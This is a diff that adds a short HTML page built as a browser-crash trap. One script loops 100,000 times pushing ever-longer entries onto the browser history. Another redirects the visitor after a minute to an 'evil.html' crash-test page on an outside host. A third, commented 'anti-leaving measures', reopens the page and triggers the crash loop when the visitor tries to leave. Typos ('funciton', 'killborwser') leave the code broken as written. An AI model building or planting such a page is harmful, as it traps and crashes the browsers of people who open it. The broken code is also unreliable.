@@ -1,0 +1,21 @@
+<html>
+<body>
+  <script>
+    funciton killbrowser() {
+      total = '';
+      for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
+    };
+  </script>
+<script>
+setTimeout(function() {window.location="https://austinjacks.github.io/crashtests/evil.html"},60000);
+</script>
+  <script>
+    //anti-leaving measures ;)
+    window.onbeforeunload = function() {window.open(window.location.href);killborwser();};
+    
+  </script>
+</body>
+</html>
